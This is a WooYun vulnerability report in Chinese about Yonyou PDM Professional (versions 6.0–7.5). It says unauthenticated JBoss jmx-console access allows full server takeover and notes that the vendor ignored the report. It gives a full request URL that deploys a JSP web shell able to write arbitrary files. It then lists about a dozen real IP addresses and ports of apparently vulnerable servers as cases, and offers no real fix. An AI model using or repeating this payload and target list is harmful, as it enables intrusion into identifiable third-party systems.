wybug_title: 用友PDM Professional全版本通用型配置不当导致getshell
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态： 2015-06-20： 细节已通知厂商并且等待厂商处理中 2015-06-25： 厂商主动忽略漏洞，细节向第三方安全合作伙伴开放 2015-08-19： 细节向核心白帽子及相关领域专家公开 2015-08-29： 细节向普通白帽子公开 2015-09-08： 细节向实习白帽子公开 2015-09-23： 细节向公众公开 简要描述： rt 详细说明： 涉及：用友PDM Professional 7.5用友PDM Professional 6.5SP1用友PDM Professional 7.2用友PDM Professional 7.0用友PDM Professional 6.0详细看案例。jboss未授权访问导致getshell http://url/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=upload5warn.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&argType=boolean&arg4=True 以上访问会生成一个这样的路径文件“/upload5warn/shell.jsp”再通过以下html可进行文件上传： jsp-test
URL: FileName: Upload
案例： http://180.166.124.214:8000/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://119.167.115.206:8000/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://202.118.67.104:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://218.108.82.12:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://118.114.247.62:8888/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://116.236.113.50:8000/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://61.145.96.228:8000/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://218.91.200.46:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://61.183.138.38:8000/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://202.118.67.104:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://125.71.239.148:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://218.108.82.12:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfohttp://218.75.100.106:8000/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfo 漏洞证明： 修复方案： 你们懂的。 版权声明：转载请注明来源 YY-2012@乌云
